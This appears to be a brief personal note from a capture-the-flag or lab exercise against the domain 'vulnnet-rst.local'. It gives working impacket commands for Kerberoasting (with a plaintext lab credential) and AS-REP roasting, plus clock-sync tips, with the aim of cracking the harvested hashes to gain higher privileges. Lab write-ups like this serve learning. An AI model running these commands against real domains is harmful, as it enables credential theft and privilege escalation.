Kerberoasting:

(You might have to change your time to sync with server. You can try this too: rdate -n 10.10.10.100, or this:
ntpdate vulnnet-rst.local. Pausing VM and waiting some minutes and retrying over and over again with variations of this and some from here <https://zweilosec.gitbook.io/htb-writeups/windows-machines/insane/apt> fixed it eventually<3, kinda lol.

Spamming ntpdate pool.ntp.org and ntpdate vulnnet-rst.local(domain we're attacking) inbetween the actual impacket command seems to make it work once every 10 tries or so, but we just need it once, so nice nice for now.)
kerberoast:
impacket-GetUserSPNs -dc-ip $target 'vulnnet-rst.local/t-skid:tj072889*' -request


asreproast:
impacket-GetNPUsers test.local/ -dc-ip $target -usersfile usernames.txt -outputfile hashes.txt

From here we hopefully get a kerberoast hash from another user with more information or higher priveleges we can crack and access.